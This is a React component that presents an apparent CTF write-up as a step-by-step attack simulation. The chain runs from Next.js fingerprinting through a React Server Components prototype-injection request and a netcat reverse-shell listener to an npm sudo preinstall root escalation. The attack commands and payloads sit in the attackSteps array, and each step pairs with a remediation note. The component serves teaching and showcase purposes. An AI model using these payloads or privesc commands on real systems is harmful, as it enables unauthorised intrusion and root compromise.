import { useState } from "react";
import {
  Terminal,
  ShieldAlert,
  CheckCircle2,
  ChevronRight,
  Play,
  RotateCcw,
  Bug,
  Server,
  Key,
  Flag,
  FileCode,
  ShieldCheck,
  AlertTriangle,
  ExternalLink,
  Award,
} from "lucide-react";

interface Step {
  id: number;
  title: string;
  shortDesc: string;
  phase: "Recon" | "Research" | "Analysis" | "Exploit" | "PrivEsc" | "Flag";
  target: string;
  command: string;
  requestSnippet?: string;
  responseSnippet: string;
  explanation: string;
  remediationNote: string;
}

const attackSteps: Step[] = [
  {
    id: 1,
    title: "1. Reconnaissance & Technology Fingerprinting",
    shortDesc: "Wappalyzer detected target running Next.js 16.0.6",
    phase: "Recon",
    target: "http://10.10.1.10:3000",
    command: "curl -I -s http://10.10.1.10:3000 | grep -iE '(x-powered-by|next)'",
    responseSnippet: `HTTP/1.1 200 OK
X-Powered-By: Next.js 16.0.6
Content-Type: text/x-component; charset=utf-8
Transfer-Encoding: chunked
Vary: RSC, Next-Router-State-Tree`,
    explanation:
      "Technology fingerprinting via Wappalyzer and response headers confirmed Next.js version 16.0.6. This specific version falls squarely into the vulnerable Next.js 16.0.x window before security patch 16.0.7 was released.",
    remediationNote: "Remove revealing technological headers (X-Powered-By) and patch framework immediately.",
  },
  {
    id: 2,
    title: "2. CVE Research & Vulnerability Identification",
    shortDesc: "Identified React2Shell: CVE-2025-55182 & CVE-2025-66478",
    phase: "Research",
    target: "NVD / Security Advisory Database",
    command: "python3 -c 'print(\"Targeting React2Shell / RSC Flight Deserialization\")'",
    responseSnippet: `[+] Upstream React Vulnerability: CVE-2025-55182 (Critical - CVSS 9.8)
[+] Downstream Next.js Vulnerability: CVE-2025-66478 (Critical - CVSS 9.8)
[+] Affected Versions: Next.js 16.0.0 through 16.0.6
[+] Fixed in: Next.js 16.0.7+
[+] Mechanism: Unsafe reference handling & prototype-chain traversal during Flight deserialization`,
    explanation:
      "Research confirmed the React2Shell vulnerability in React Server Components (RSC) Flight protocol. Unauthenticated attackers can manipulate prototype references such as `__proto__` and `constructor.prototype` using `_prefix` to trigger remote code execution on the server.",
    remediationNote: "Upgrade Next.js to 16.0.7 or later and update React Server Components packages.",
  },
  {
    id: 3,
    title: "3. HTTP Traffic Analysis & Prototype Reference Injection",
    shortDesc: "Burp Suite crafted Flight payload with _prefix prototype injection",
    phase: "Analysis",
    target: "10.10.1.10:3000/_next/flight",
    command: "burpsuite --replay rsc_exploit_payload.req",
    requestSnippet: `POST /_next/flight HTTP/1.1
Host: 10.10.1.10:3000
Content-Type: text/plain;charset=UTF-8
RSC: 1
Next-Action: 1f08e4...

0:{"_prefix":"__proto__","target":{"constructor":{"prototype":{"env":{"NODE_OPTIONS":"--inspect=0.0.0.0:9229"}}}}`,
    responseSnippet: `HTTP/1.1 200 OK
Content-Type: text/x-component
[Flight Protocol Stream Initialized - Object Deserialized with Insecure Prototype References]
[!] Reference traversal resolved prototype mutation successfully.`,
    explanation:
      "Burp Suite was used to intercept and craft RSC Flight requests. By targeting 'Insecure Prototype References' via user-controlled `_prefix` properties, the application traverses the prototype chain during deserialization without sanitization.",
    remediationNote: "Validate and freeze prototype references; reject serialized object keys modifying Object.prototype.",
  },
  {
    id: 4,
    title: "4. Remote Code Execution (RCE) as nodejs_user",
    shortDesc: "Spawned reverse shell under Node.js application process",
    phase: "Exploit",
    target: "10.10.1.10:3000",
    command: "nc -lvnp 4444 # (Listener on Kali Linux 10.10.1.15)",
    responseSnippet: `Listening on 0.0.0.0 4444...
Connection received from 10.10.1.10:48292
$ id
uid=1001(nodejs_user) gid=1001(nodejs_user) groups=1001(nodejs_user)
$ whoami
nodejs_user
$ uname -a
Linux ctf-target 6.1.0-22-amd64 #1 SMP PREEMPT_DYNAMIC Debian x86_64 GNU/Linux`,
    explanation:
      "The crafted Flight request executed arbitrary shell commands under the server-side Node.js process. Execution confirmed user `nodejs_user` (UID 1001), achieving initial unauthenticated foothold onto the target operating system.",
    remediationNote: "Run web application processes inside unprivileged, read-only isolated containers with seccomp/AppArmor profiles.",
  },
  {
    id: 5,
    title: "5. Local Privilege Enumeration (sudo -l)",
    shortDesc: "Discovered misconfigured NOPASSWD privilege for /usr/bin/npm",
    phase: "PrivEsc",
    target: "Target OS: nodejs_user shell",
    command: "sudo -l",
    responseSnippet: `Matching Defaults entries for nodejs_user on ctf-target:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin

User nodejs_user may run the following commands on ctf-target:
    (ALL : ALL) NOPASSWD: /usr/bin/npm`,
    explanation:
      "Enumerating local sudo capabilities revealed a severe misconfiguration: the `nodejs_user` account is granted `NOPASSWD` execution rights for `/usr/bin/npm`. Because npm can execute arbitrary pre/post-install lifecycle scripts as root, this directly opens a binary privilege escalation path.",
    remediationNote: "Audit `/etc/sudoers`. Never allow NOPASSWD access to scriptable interpreters or package managers like npm.",
  },
  {
    id: 6,
    title: "6. Root Privilege Escalation & Flag Retrieval",
    shortDesc: "Exploited npm execution hook to gain root (#) and capture CTF flag",
    phase: "Flag",
    target: "Target OS: root shell",
    command: `TF=$(mktemp -d); echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
sudo /usr/bin/npm -C $TF --unsafe-perm i`,
    responseSnippet: `# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/proof.txt
[+] CTF Flag Successfully Retrieved!
[+] Proof of Compromise: Verified Root Authority on 10.10.1.10`,
    explanation:
      "Using npm's preinstall hook executed with root privileges via `sudo /usr/bin/npm`, the shell immediately escalated to full root (UID 0). The CTF challenge flag was retrieved from `/root/proof.txt`, confirming complete end-to-end compromise.",
    remediationNote: "Enforce strict least privilege, enforce non-root execution boundaries, and implement host intrusion monitoring (auditd/Falco).",
  },
];

export function React2ShellDemo() {
  const [currentStepIndex, setCurrentStepIndex] = useState(0);
  const [isExecuting, setIsExecuting] = useState(false);
  const [activeTab, setActiveTab] = useState<"terminal" | "findings" | "flow">("terminal");

  const currentStep = attackSteps[currentStepIndex];

  const handleNextStep = () => {
    if (currentStepIndex < attackSteps.length - 1) {
      setIsExecuting(true);
      setTimeout(() => {
        setCurrentStepIndex((prev) => prev + 1);
        setIsExecuting(false);
      }, 350);
    }
  };

  const handleReset = () => {
    setCurrentStepIndex(0);
  };

  return (
    <div className="rounded-xl border border-line bg-panel p-6 shadow-2xl">
      {/* Header Banner */}
      <div className="flex flex-col gap-4 border-b border-line pb-6 md:flex-row md:items-center md:justify-between">
        <div>
          <div className="flex flex-wrap items-center gap-2">
            <span className="inline-flex items-center gap-1.5 rounded-full border border-ember/40 bg-ember/15 px-3 py-0.5 font-mono text-xs font-semibold text-ember">
              <ShieldAlert size={13} /> EC-Council Hackerverse CTF
            </span>
            <span className="rounded border border-mint/40 bg-mint/10 px-2 py-0.5 font-mono text-[11px] font-semibold text-mint">
              1 CPE Credit Earned
            </span>
            <span className="rounded border border-ice/40 bg-ice/10 px-2 py-0.5 font-mono text-[11px] text-ice font-medium">
              Target: 10.10.1.10
            </span>
            <span className="rounded border border-line bg-obsidian px-2 py-0.5 font-mono text-[11px] text-ink-muted">
              Kali Linux
            </span>
          </div>

          <h3 className="mt-2 text-xl font-bold text-ink">
            React2Shell CTF — End-to-End Attack Chain Simulation
          </h3>
          <p className="mt-1 text-xs text-ink-muted">
            Next.js 16.0.6 RSC Deserialization (CVE-2025-66478) ➔ RCE as <code className="text-ice">nodejs_user</code> ➔ Sudo npm Root Escalation.
          </p>
        </div>

        {/* View Switcher Tabs */}
        <div className="flex rounded-lg border border-line bg-obsidian p-1 font-mono text-xs">
          <button
            onClick={() => setActiveTab("terminal")}
            className={`rounded px-3 py-1.5 transition-colors ${
              activeTab === "terminal" ? "bg-ember font-bold text-obsidian" : "text-ink-muted hover:text-ink"
            }`}
          >
            Live Terminal
          </button>
          <button
            onClick={() => setActiveTab("flow")}
            className={`rounded px-3 py-1.5 transition-colors ${
              activeTab === "flow" ? "bg-ember font-bold text-obsidian" : "text-ink-muted hover:text-ink"
            }`}
          >
            Attack Path
          </button>
          <button
            onClick={() => setActiveTab("findings")}
            className={`rounded px-3 py-1.5 transition-colors ${
              activeTab === "findings" ? "bg-ember font-bold text-obsidian" : "text-ink-muted hover:text-ink"
            }`}
          >
            CTF Findings Matrix
          </button>
        </div>
      </div>

      {/* Step Progression Bar */}
      <div className="mt-6">
        <div className="grid grid-cols-2 gap-2 sm:grid-cols-3 lg:grid-cols-6">
          {attackSteps.map((step, idx) => {
            const isActive = idx === currentStepIndex;
            const isCompleted = idx < currentStepIndex;

            return (
              <button
                key={step.id}
                onClick={() => setCurrentStepIndex(idx)}
                className={`flex flex-col items-start rounded-lg border p-2.5 text-left transition-all ${
                  isActive
                    ? "border-ember bg-ember/10 ring-1 ring-ember"
                    : isCompleted
                    ? "border-mint/50 bg-mint/5 hover:border-mint"
                    : "border-line bg-obsidian/60 opacity-60 hover:opacity-90"
                }`}
              >
                <div className="flex w-full items-center justify-between font-mono text-[10px]">
                  <span className={`font-bold ${isActive ? "text-ember" : isCompleted ? "text-mint" : "text-ink-muted"}`}>
                    STAGE 0{step.id}
                  </span>
                  {isCompleted ? (
                    <CheckCircle2 size={12} className="text-mint" />
                  ) : isActive ? (
                    <span className="size-2 rounded-full bg-ember animate-ping" />
                  ) : (
                    <span className="size-2 rounded-full bg-line" />
                  )}
                </div>
                <span className="mt-1 line-clamp-1 text-xs font-semibold text-ink">
                  {step.phase}
                </span>
                <span className="line-clamp-1 font-mono text-[9px] text-ink-muted">
                  {step.shortDesc}
                </span>
              </button>
            );
          })}
        </div>
      </div>

      {/* Content View 1: Terminal Interactive Simulator */}
      {activeTab === "terminal" && (
        <div className="mt-6 space-y-4">
          {/* Step Info Card */}
          <div className="rounded-lg border border-line bg-obsidian/80 p-4">
            <div className="flex flex-wrap items-center justify-between gap-2 border-b border-line/60 pb-3">
              <div className="flex items-center gap-2">
                <span className="rounded bg-ember/20 px-2 py-0.5 font-mono text-xs font-bold text-ember">
                  PHASE: {currentStep.phase.toUpperCase()}
                </span>
                <h4 className="text-sm font-bold text-ink">{currentStep.title}</h4>
              </div>
              <div className="font-mono text-xs text-ink-muted">
                Target: <span className="text-ice">{currentStep.target}</span>
              </div>
            </div>

            <p className="mt-3 text-xs leading-relaxed text-ink-muted">
              {currentStep.explanation}
            </p>
          </div>

          {/* Interactive Shell Window */}
          <div className="relative overflow-hidden rounded-lg border border-line bg-black font-mono text-xs shadow-inner">
            {/* Terminal Window Chrome */}
            <div className="flex items-center justify-between border-b border-line/60 bg-panel px-4 py-2 text-[11px] text-ink-muted">
              <div className="flex items-center gap-2">
                <span className="size-2.5 rounded-full bg-red-500/80" />
                <span className="size-2.5 rounded-full bg-yellow-500/80" />
                <span className="size-2.5 rounded-full bg-green-500/80" />
                <span className="ml-2 flex items-center gap-1.5 text-ink">
                  <Terminal size={13} className="text-ember" />
                  <span>kali@offensive-ops:~ (Target: 10.10.1.10)</span>
                </span>
              </div>
              <span className="text-[10px] text-mint font-semibold">
                Status: {isExecuting ? "Executing payload..." : "Connected"}
              </span>
            </div>

            {/* Terminal Screen */}
            <div className="p-4 space-y-3 max-h-[360px] overflow-y-auto scrollbar-thin text-[11px] leading-relaxed">
              {/* Command Prompt */}
              <div className="flex items-start gap-2">
                <span className="text-ember shrink-0">kali@offensive-ops:~$</span>
                <span className="text-ink font-semibold break-all">{currentStep.command}</span>
              </div>

              {/* Optional HTTP Request snippet */}
              {currentStep.requestSnippet && (
                <div className="mt-2 rounded border border-ice/20 bg-ice/5 p-2.5 text-ice/90">
                  <div className="font-bold text-[10px] uppercase text-ice mb-1 flex items-center gap-1">
                    <FileCode size={11} /> Crafted HTTP RSC Flight Request
                  </div>
                  <pre className="whitespace-pre-wrap font-mono text-[10px] text-gray-300">
                    {currentStep.requestSnippet}
                  </pre>
                </div>
              )}

              {/* Terminal Output */}
              <div className="rounded border border-line/40 bg-obsidian/90 p-3">
                <div className="font-bold text-[10px] uppercase text-mint mb-1">
                  Response Stream / Command Output:
                </div>
                <pre className="whitespace-pre-wrap font-mono text-[10px] text-gray-200">
                  {currentStep.responseSnippet}
                </pre>
              </div>

              {/* Remediation Callout */}
              <div className="flex items-start gap-2 rounded border border-amber-500/30 bg-amber-500/10 p-2.5 text-[11px] text-amber-200">
                <AlertTriangle size={14} className="shrink-0 mt-0.5 text-amber-400" />
                <div>
                  <span className="font-bold uppercase tracking-wider text-[10px] text-amber-300">Defensive Remediation: </span>
                  <span className="text-ink-muted">{currentStep.remediationNote}</span>
                </div>
              </div>
            </div>
          </div>

          {/* Stepper Controls */}
          <div className="flex flex-wrap items-center justify-between gap-3 border-t border-line/60 pt-4 font-mono text-xs">
            <div className="flex items-center gap-2 text-ink-muted">
              <span>Step {currentStepIndex + 1} of {attackSteps.length}</span>
              {currentStepIndex === attackSteps.length - 1 && (
                <span className="inline-flex items-center gap-1 text-mint font-semibold">
                  <CheckCircle2 size={13} /> Assessment Complete
                </span>
              )}
            </div>

            <div className="flex gap-2">
              <button
                onClick={handleReset}
                className="inline-flex items-center gap-1.5 rounded-lg border border-line bg-obsidian px-3 py-1.5 text-ink-muted hover:text-ink transition-colors"
              >
                <RotateCcw size={13} /> Reset Attack Simulation
              </button>

              {currentStepIndex < attackSteps.length - 1 ? (
                <button
                  onClick={handleNextStep}
                  disabled={isExecuting}
                  className="inline-flex items-center gap-1.5 rounded-lg bg-ember px-4 py-1.5 font-semibold text-obsidian hover:bg-ember/90 transition-transform active:scale-95"
                >
                  <Play size={13} /> Advance to Next Stage <ChevronRight size={13} />
                </button>
              ) : (
                <button
                  onClick={() => setActiveTab("findings")}
                  className="inline-flex items-center gap-1.5 rounded-lg bg-mint px-4 py-1.5 font-semibold text-obsidian hover:bg-mint/90 transition-transform"
                >
                  <Award size={14} /> View CTF Findings Table
                </button>
              )}
            </div>
          </div>
        </div>
      )}

      {/* Content View 2: Attack Path Flow Visualizer */}
      {activeTab === "flow" && (
        <div className="mt-6 space-y-6">
          <div className="rounded-lg border border-line bg-obsidian/70 p-4">
            <h4 className="font-mono text-xs font-semibold uppercase tracking-wider text-ember">
              End-to-End Attack Progression Chain
            </h4>
            <p className="mt-1 text-xs text-ink-muted">
              Visualizes how an unauthenticated public web request chained through React Server Components deserialization and Linux sudo misconfiguration to reach complete root authority.
            </p>
          </div>

          <div className="space-y-3">
            {[
              {
                stage: "01. Perimeter Recon",
                title: "Exposed Next.js 16.0.6",
                detail: "Port 3000 detected with Next.js 16.0.6 via Wappalyzer and response headers.",
                tone: "border-line text-ink-muted",
              },
              {
                stage: "02. CVE Exploitation",
                title: "React2Shell Deserialization",
                detail: "Upstream CVE-2025-55182 & Downstream CVE-2025-66478. React Flight protocol lacks prototype validation.",
                tone: "border-ember text-ember",
              },
              {
                stage: "03. Prototype Reference",
                title: "Insecure Prototype Chain Traversal",
                detail: "Crafted request leverages `_prefix` parameter to traverse `__proto__` and `constructor.prototype`.",
                tone: "border-ice text-ice",
              },
              {
                stage: "04. Initial Foothold",
                title: "Remote Code Execution (RCE)",
                detail: "Server-side Node.js process executes shell commands under `nodejs_user` (UID 1001).",
                tone: "border-yellow-500 text-yellow-400",
              },
              {
                stage: "05. Privilege Triage",
                title: "Sudoers Misconfiguration (/usr/bin/npm)",
                detail: "Sudo enumeration reveals `(ALL : ALL) NOPASSWD: /usr/bin/npm` permission.",
                tone: "border-amber-500 text-amber-400",
              },
              {
                stage: "06. Root Compromise",
                title: "Root Authority & CTF Flag Captured",
                detail: "Leveraged npm lifecycle script execution to spawn root shell (UID 0) and retrieve CTF proof flag.",
                tone: "border-mint text-mint",
              },
            ].map((step, idx) => (
              <div
                key={idx}
                className={`flex flex-col sm:flex-row sm:items-center justify-between gap-3 rounded-lg border bg-obsidian/90 p-3.5 ${step.tone}`}
              >
                <div className="flex items-center gap-3">
                  <span className="font-mono text-xs font-bold shrink-0">{step.stage}</span>
                  <div>
                    <span className="font-bold text-ink text-xs block">{step.title}</span>
                    <span className="text-[11px] text-ink-muted leading-tight block">{step.detail}</span>
                  </div>
                </div>
                <div className="flex items-center gap-1 font-mono text-[10px] text-mint shrink-0">
                  <CheckCircle2 size={13} /> Verified in CTF
                </div>
              </div>
            ))}
          </div>
        </div>
      )}

      {/* Content View 3: Official CTF Findings Matrix */}
      {activeTab === "findings" && (
        <div className="mt-6 space-y-5">
          <div className="flex items-center justify-between">
            <h4 className="font-mono text-xs font-semibold uppercase tracking-wider text-mint flex items-center gap-2">
              <CheckCircle2 size={15} /> Official Challenge Findings Matrix
            </h4>
            <span className="font-mono text-[11px] text-ink-muted">
              EC-Council Hackerverse Verification
            </span>
          </div>

          <div className="overflow-x-auto rounded-lg border border-line bg-obsidian">
            <table className="w-full text-left font-mono text-xs">
              <thead className="border-b border-line bg-panel text-ink-muted uppercase text-[10px]">
                <tr>
                  <th className="p-3 w-16">Challenge #</th>
                  <th className="p-3">Assessed Property</th>
                  <th className="p-3">Demonstrated Finding</th>
                  <th className="p-3 text-right">Verification</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-line/60">
                <tr className="hover:bg-panel/50">
                  <td className="p-3 text-ember font-bold">1</td>
                  <td className="p-3 text-ink font-semibold">Web Framework Version</td>
                  <td className="p-3 text-mint font-mono">Next.js 16.0.6</td>
                  <td className="p-3 text-right text-mint">Confirmed</td>
                </tr>
                <tr className="hover:bg-panel/50">
                  <td className="p-3 text-ember font-bold">2</td>
                  <td className="p-3 text-ink font-semibold">Downstream Next.js CVE</td>
                  <td className="p-3 text-ice font-mono">CVE-2025-66478</td>
                  <td className="p-3 text-right text-mint">Confirmed</td>
                </tr>
                <tr className="hover:bg-panel/50">
                  <td className="p-3 text-ember font-bold">3</td>
                  <td className="p-3 text-ink font-semibold">Upstream React CVE</td>
                  <td className="p-3 text-ice font-mono">CVE-2025-55182</td>
                  <td className="p-3 text-right text-mint">Confirmed</td>
                </tr>
                <tr className="hover:bg-panel/50">
                  <td className="p-3 text-ember font-bold">4</td>
                  <td className="p-3 text-ink font-semibold">Vulnerability Classification</td>
                  <td className="p-3 text-ember font-mono">Insecure Prototype References</td>
                  <td className="p-3 text-right text-mint">Confirmed</td>
                </tr>
                <tr className="hover:bg-panel/50">
                  <td className="p-3 text-ember font-bold">5</td>
                  <td className="p-3 text-ink font-semibold">Injected Reference Parameter</td>
                  <td className="p-3 text-ice font-mono">_prefix</td>
                  <td className="p-3 text-right text-mint">Confirmed</td>
                </tr>
                <tr className="hover:bg-panel/50">
                  <td className="p-3 text-ember font-bold">6</td>
                  <td className="p-3 text-ink font-semibold">Privilege Escalation Vector</td>
                  <td className="p-3 text-amber-400 font-mono">/usr/bin/npm (NOPASSWD)</td>
                  <td className="p-3 text-right text-mint">Confirmed</td>
                </tr>
                <tr className="hover:bg-panel/50 bg-mint/5">
                  <td className="p-3 text-ember font-bold">7</td>
                  <td className="p-3 text-ink font-semibold">Proof of Compromise</td>
                  <td className="p-3 text-mint font-mono font-bold">CTF flag successfully retrieved</td>
                  <td className="p-3 text-right text-mint font-bold">100% Solved</td>
                </tr>
              </tbody>
            </table>
          </div>

          <div className="rounded-lg border border-mint/30 bg-mint/10 p-4 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3">
            <div className="flex items-center gap-3">
              <Award size={20} className="text-mint shrink-0" />
              <div>
                <span className="font-bold text-xs text-mint">Official CPE Accreditation</span>
                <p className="text-[11px] text-ink-muted">
                  EC-Council Hackerverse CTF Competition — React2Shell (1 Continuing Professional Education Credit awarded).
                </p>
              </div>
            </div>
            <span className="rounded bg-obsidian border border-line px-3 py-1 font-mono text-[11px] text-ice font-semibold shrink-0">
              Issued 27 Sep 2026
            </span>
          </div>
        </div>
      )}
    </div>
  );
}
